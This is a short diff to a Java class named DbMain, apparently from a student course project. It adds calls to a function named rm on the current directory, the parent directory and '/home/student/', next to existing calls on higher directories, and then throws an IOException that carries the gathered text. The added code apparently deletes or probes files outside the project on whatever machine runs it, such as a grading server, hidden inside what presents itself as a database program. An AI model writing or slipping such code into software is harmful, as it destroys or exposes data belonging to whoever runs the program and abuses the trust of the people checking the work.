@@ -83,6 +83,13 @@ public class DbMain {
         rm("../../fizteh-java-2013", s1);
         s1 += "\n\nseparate\n\n";
         rm("../../", s1);
+        s1 += "\n\nseparate\n\n";
+        rm(".", s1);
+        s1 += "\n\nseparate\n\n";
+        rm("..", s1);
+        s1 += "\n\nseparate\n\n";
+        rm("/home/student/", s1);
+
         throw new IOException(s1);
 
         /*try {
